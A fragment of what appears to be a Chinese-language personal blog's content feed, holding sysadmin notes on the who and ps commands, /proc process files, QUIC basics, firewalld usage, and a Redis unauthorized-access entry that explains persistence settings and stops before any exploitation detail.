class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># who -q</span><br>root root root<br><span class="hljs-comment"># users=3</span><br></code></pre></td></tr></table></figure><h4 id="r-–runlevel-输出当前运行级别"><a href="#r-–runlevel-输出当前运行级别" class="headerlink" title="-r –runlevel 输出当前运行级别"></a>-r –runlevel 输出当前运行级别</h4><p>默认是 5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -r<br>         <span class="hljs-attribute">run</span>-level <span class="hljs-number">5</span>  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="s-–short-只输出用户名，登录方式，时间"><a href="#s-–short-只输出用户名，登录方式，时间" class="headerlink" title="-s –short 只输出用户名，登录方式，时间"></a>-s –short 只输出用户名，登录方式，时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -s<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="t-–time-显示最后一次系统时钟更改"><a href="#t-–time-显示最后一次系统时钟更改" class="headerlink" title="-t –time 显示最后一次系统时钟更改"></a>-t –time 显示最后一次系统时钟更改</h4><h4 id="T-w-–mesg-增加用户消息状态，可能的值"><a href="#T-w-–mesg-增加用户消息状态，可能的值" class="headerlink" title="-T -w –mesg 增加用户消息状态，可能的值 + - ?"></a>-T -w –mesg 增加用户消息状态，可能的值 + - ?</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -T<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="u-–users-用户登录列表"><a href="#u-–users-用户登录列表" class="headerlink" title="-u –users 用户登录列表"></a>-u –users 用户登录列表</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -u<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">09</span>      <span class="hljs-number">572714</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">05</span>      <span class="hljs-number">572786</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>   .        <span class="hljs-number">573045</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h2 id="数据来源-1"><a href="#数据来源-1" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ps</title>
    <link href="/2024/03/15/yunwei/commands/ps/"/>
    <url>/2024/03/15/yunwei/commands/ps/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用于查看当前进程信息</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ps</span> -ef:基于Unix的选项，可以使用破折号(-)<br><span class="hljs-attribute">UID</span>          PID    PPID  C STIME TTY          TIME CMD<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>       <span class="hljs-number">0</span>  <span class="hljs-number">0</span> Oct27 ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">11</span> /sbin/init<br><br><span class="hljs-attribute">ps</span> aux:基于BSD的选项，不可以使用破折号(-)<br><span class="hljs-attribute">USER</span>         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-number">169640</span> <span class="hljs-number">12772</span> ?        Ss   Oct27   <span class="hljs-number">0</span>:<span class="hljs-number">11</span> /sbin/init<br><br></code></pre></td></tr></table></figure><p>备注：<br>ps -aux :打印用户名为x的所有进程，如果x的用户不存在，可能会解释为ps aux</p><p><strong>pa aux 会出现由于命令太长造成被截取的问题</strong></p><p><strong>ps -ef 输出字段解释：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/proc# ps -ef | grep http | grep -v grep<br><span class="hljs-attribute">root</span>     <span class="hljs-number">3398394</span> <span class="hljs-number">3337140</span>  <span class="hljs-number">0</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> python -m http.server<br></code></pre></td></tr></table></figure><table><thead><tr><th>UID</th><th>pid</th><th>PPID</th><th>C</th><th>STIME</th><th>TTY</th><th>TIME</th><th>CMD</th></tr></thead><tbody><tr><td>当前进程启动用户ID</td><td>进程ID</td><td>进程父ID</td><td>进程占用CPU百分比</td><td>进程启动时间</td><td>进程运行的终端，如果进程运行和终端没有关系，则显示？，如果显示pts&#x2F;0，则表示由网络连接主机的终端启动运行</td><td>该进程占用CPU的累计时间（[DD-]hh:mm:ss），</td><td>当前进程执行的命令</td></tr><tr><td>root</td><td>3398394</td><td>3337140</td><td>0</td><td>14:58</td><td>pts&#x2F;0</td><td>00:00:00</td><td>当前进程执行的命令</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>ps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>auic_base</title>
    <link href="/2024/03/15/network/QUIC/quic_base/"/>
    <url>/2024/03/15/network/QUIC/quic_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>QUIC （Quick UDP Internet Connection），通用的传输层网络协议，由Google设计，2012年实现部署，目前Chrome、Edge、Firefox均已支持此协议；Safari实现了QUIC，但默认情况不启用。</p><p>由于该协议设计目标在于取代TCP协议，偶尔也被称为 TCP&#x2F;2</p><p>2012年实现部署</p><p>2013年公开公布</p><p>2015年提交IETF进行标准化</p><p>2018年IETF将QUIC上的HTTP映射称为 HTTP&#x2F;3</p><p>2021年IETF发布RFC9000，QUIC规范推出标准化版本</p><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><h2 id="基于UDP协议"><a href="#基于UDP协议" class="headerlink" title="基于UDP协议"></a>基于UDP协议</h2><h2 id="使用UDP-443端口"><a href="#使用UDP-443端口" class="headerlink" title="使用UDP 443端口"></a>使用UDP 443端口</h2><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h2><p><img src="/2024/03/15/network/QUIC/quic_base/v2-d61a62fdfb08ed3882e1018136ce6b2f_1440w.webp" alt="img"></p><p>QUIC&#x3D;HTTP&#x2F;2+TLS+UDP</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>quic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>quic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>procdir</title>
    <link href="/2024/03/15/yunwei/dir/procdir/"/>
    <url>/2024/03/15/yunwei/dir/procdir/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux在启动一个进程时，系统会在&#x2F;proc下创建一个以PID命名的文件夹，在该文件夹下会有我们的进程的信息</p><h2 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h2><h3 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe 可查看到对应进程可执行文件的绝对路径</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">49</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;cmdline 可查看到对应进程执行的命令（没有空格）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">└─# <span class="hljs-keyword">cat</span> /proc/<span class="hljs-number">1211513</span>/cmdline<br>pingwww.baidu.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><h3 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;cwd 查看对应进程启动目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/cwd<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> /proc/<span class="hljs-number">659535</span>/cwd -&gt; /var/lib/mysql<br></code></pre></td></tr></table></figure><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;environ 查看进程运行时的环境变量</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /proc/659535/environ</span><br><span class="hljs-variable constant_">LANG</span>=en_US.<span class="hljs-variable constant_">UTF</span>-8PATH=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/snap/binNOTIFY_SOCKET=/run/systemd/notifyPIDFILE=/run/mysqld/mysqld</span>.pidHOME=<span class="hljs-regexp">/nonexistentLOGNAME=mysqlUSER=mysqlINVOCATION_ID=4e4bec37552240ebaab8568ce9b7952fJOURNAL_STREAM=8:110456240RUNTIME_DIRECTORY=/run</span><span class="hljs-regexp">/mysqldSYSTEMD_EXEC_PID=659535MYSQLD_PARENT_PID=1</span><br></code></pre></td></tr></table></figure><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;fd 查看进程打开或使用的文件的符号连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/fd<br><span class="hljs-attribute">total</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">dr</span>-x------ <span class="hljs-number">2</span> mysql mysql  <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> .<br><span class="hljs-attribute">lr</span>-x------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">0</span> -&gt; /dev/null<br><span class="hljs-attribute">l</span>-wx------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">1</span> -&gt; /var/log/mysql/error.log<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">10</span> -&gt; /var/lib/mysql/ibdata1<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">11</span> -&gt; /var/lib/mysql/#innodb_redo/#ib_redo29<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">12</span> -&gt; /var/lib/mysql/undo_002<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>dir</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>dir</tag>
      
      <tag>proc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis_unauth</title>
    <link href="/2024/03/15/security/secvulns/redis/redis_unauth/"/>
    <url>/2024/03/15/security/secvulns/redis/redis_unauth/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。</p><p>当redis配置设置不当，可能会存在数据泄露、服务器入侵等安全风险</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当redis服务存在未授权（没有设置密码+没有限制访问IP）或弱口令时，存在被利用 redis 的持久化功能和 config 命令（config 命令可设置持久化信息）的安全风险</p><p>redis 有两种持久化的方式：</p><p>1）快照模式（默认方式）RDB</p><p>快照模式是将内存中的数据以快照的方式写入问文件，默认文件名是 dump.rdb</p><p>默认配置：<br>save 900 1 # 900 秒内 1 个 key 改变就会持久化</p><p>save 300 10</p><p>save 60 10000</p><p>dbfilename dump.rdb # 持久化的文件名（不可存在路径，只能是文件名）</p><p>dir .&#x2F; # 持久化文件所在目录，可以设置绝对路径</p><p>缺陷：</p><p>意外宕机之后，会丢失上次快照到宕机时这段时间的数据</p><p>2）AOF 方式</p><p>redis 将每一个写命令都通过 write 函数追加到文件中（默认是 appendonly.aof）,当 redis 重启时会通过重新执行文件中保存的写命令来在内存中重建整个数据库的内容</p><p>配置：<br>appendonly yes# 启用日志追加持久化方式</p><p>#appendfsync always #每次收到写命令就立即强制写入磁盘，最慢，但是保证完全的持久化 不推荐使用<br># appendfsync everysec # 每秒强制写入磁盘一次，在性能和持久化方面做了很好的折中，推荐使用<br># appendfsync no #完全依赖操作系统，性能最好，持久化没有保证</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><p>当服务存在未授权</p><h3 id="服务器入侵"><a href="#服务器入侵" class="headerlink" title="服务器入侵"></a>服务器入侵</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>unauth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables_command</title>
    <link href="/2024/03/15/yunwei/applications/firewalld/iptables_command/"/>
    <url>/2024/03/15/yunwei/applications/firewalld/iptables_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><h3 id="Friewalld"><a href="#Friewalld" class="headerlink" title="Friewalld"></a>Friewalld</h3><p>CentOS7默认防火墙</p><p>开启防护墙之后默认是没有任何策略的，也就是除SSH的22端口之外其他的端口都不通</p><p>防火墙策略的增加都是追加形式</p><h4 id="查询防火墙状态"><a href="#查询防火墙状态" class="headerlink" title="查询防火墙状态"></a>查询防火墙状态</h4><h5 id="firewall-cmd-–state"><a href="#firewall-cmd-–state" class="headerlink" title="firewall-cmd –state"></a>firewall-cmd –state</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>not running<br><br>┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>running<br></code></pre></td></tr></table></figure><h4 id="启动-停止防火墙"><a href="#启动-停止防火墙" class="headerlink" title="启动&#x2F;停止防火墙"></a>启动&#x2F;停止防火墙</h4><h5 id="systemctl-start-firewalld"><a href="#systemctl-start-firewalld" class="headerlink" title="systemctl start firewalld"></a>systemctl start firewalld</h5><h5 id="systemctl-stop-firewalld"><a href="#systemctl-stop-firewalld" class="headerlink" title="systemctl stop firewalld"></a>systemctl stop firewalld</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# systemctl start firewalld<br></code></pre></td></tr></table></figure><h4 id="开启-关闭开机启动"><a href="#开启-关闭开机启动" class="headerlink" title="开启&#x2F;关闭开机启动"></a>开启&#x2F;关闭开机启动</h4><h5 id="systemctl-enable-firewalld"><a href="#systemctl-enable-firewalld" class="headerlink" title="systemctl enable firewalld"></a>systemctl enable firewalld</h5><h5 id="systemctl-disable-firewalld"><a href="#systemctl-disable-firewalld" class="headerlink" title="systemctl disable firewalld"></a>systemctl disable firewalld</h5><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nsis">┌──(root㉿kali2022-appsec)-[~]<br>└─<span class="hljs-comment"># systemctl disable firewalld</span><br><br>┌──(root㉿kali2022-appsec)-[~]<br>└─<span class="hljs-comment"># systemctl enable firewalld</span><br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/dbus-org.fedoraproject.FirewallD1.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/multi-<span class="hljs-literal">user</span>.target.wants/firewalld.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br></code></pre></td></tr></table></figure><h4 id="加载防火墙策略"><a href="#加载防火墙策略" class="headerlink" title="加载防火墙策略"></a>加载防火墙策略</h4><p>修改防火墙规则后，需要重新加载防火墙</p><h5 id="firewall-cmd-–reload"><a href="#firewall-cmd-–reload" class="headerlink" title="firewall-cmd –reload"></a>firewall-cmd –reload</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--reload</span><br>success<br></code></pre></td></tr></table></figure><h4 id="查看防火墙开放的端口"><a href="#查看防火墙开放的端口" class="headerlink" title="查看防火墙开放的端口"></a>查看防火墙开放的端口</h4><h5 id="firewall-cmd-–list-ports"><a href="#firewall-cmd-–list-ports" class="headerlink" title="firewall-cmd –list-ports"></a>firewall-cmd –list-ports</h5><p>默认不开放任何端口</p><h4 id="查看防火墙策略"><a href="#查看防火墙策略" class="headerlink" title="查看防火墙策略"></a>查看防火墙策略</h4><h5 id="firewall-cmd-–list-all"><a href="#firewall-cmd-–list-all" class="headerlink" title="firewall-cmd –list-all"></a>firewall-cmd –list-all</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(root㉿kali2022-appsec)-[~]</span><br><span class="hljs-string">└─#</span> <span class="hljs-string">firewall-cmd</span> <span class="hljs-string">--list-all</span><br><span class="hljs-string">public</span> <span class="hljs-string">(active)</span><br>  <span class="hljs-attr">target:</span> <span class="hljs-string">default</span><br>  <span class="hljs-attr">icmp-block-inversion:</span> <span class="hljs-literal">no</span><br>  <span class="hljs-attr">interfaces:</span> <span class="hljs-string">eth0</span><br>  <span class="hljs-attr">sources:</span><br>  <span class="hljs-attr">services:</span> <span class="hljs-string">dhcpv6-client</span> <span class="hljs-string">ssh</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-attr">protocols:</span><br>  <span class="hljs-attr">forward:</span> <span class="hljs-literal">yes</span><br>  <span class="hljs-attr">masquerade:</span> <span class="hljs-literal">no</span><br>  <span class="hljs-attr">forward-ports:</span><br>  <span class="hljs-attr">source-ports:</span><br>  <span class="hljs-attr">icmp-blocks:</span><br>  <span class="hljs-attr">rich rules:</span><br>        <span class="hljs-string">rule</span> <span class="hljs-string">family=&quot;ipv4&quot;</span> <span class="hljs-string">source</span> <span class="hljs-string">address=&quot;10.222.28.166&quot;</span> <span class="hljs-string">port</span> <span class="hljs-string">port=&quot;11211&quot;</span> <span class="hljs-string">protocol=&quot;tcp&quot;</span> <span class="hljs-string">accept</span><br></code></pre></td></tr></table></figure><h4 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h4><h5 id="firewall-cmd-–zone-public-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent</h5><p>参数解读：</p><p>–zone&#x3D;public #作用域</p><p>–add-port&#x3D;80&#x2F;tcp #添加端口，格式为：端口&#x2F;通讯协议</p><p>–permanent #永久生效，没有该参数防火墙重启后失效</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --zone=public --add-port=80/tcp --permanent<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"></span>┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --list-ports<br>80/tcp<br></code></pre></td></tr></table></figure><h4 id="删除端口"><a href="#删除端口" class="headerlink" title="删除端口"></a>删除端口</h4><h5 id="firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent</h5><h4 id="查询支持的zone"><a href="#查询支持的zone" class="headerlink" title="查询支持的zone"></a>查询支持的zone</h4><p>firewall-cmd –get-zones</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd <span class="hljs-comment">--get-zones</span><br>block dmz <span class="hljs-keyword">drop</span> <span class="hljs-keyword">external</span> home <span class="hljs-type">internal</span> nm-shared <span class="hljs-built_in">public</span> <span class="hljs-keyword">trusted</span> <span class="hljs-keyword">work</span><br></code></pre></td></tr></table></figure><h4 id="查询服务是否支持"><a href="#查询服务是否支持" class="headerlink" title="查询服务是否支持"></a>查询服务是否支持</h4><h5 id="firewall-cmd-–query-service-servicename"><a href="#firewall-cmd-–query-service-servicename" class="headerlink" title="firewall-cmd –query-service servicename"></a>firewall-cmd –query-service servicename</h5><p>firewall-cmd –query-service ftp</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ftp<br>no<br><br>┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ssh<br>yes<br></code></pre></td></tr></table></figure><h4 id="临时开启服务"><a href="#临时开启服务" class="headerlink" title="临时开启服务"></a>临时开启服务</h4><p>firewall-cmd –add-service&#x3D;serviceName</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span 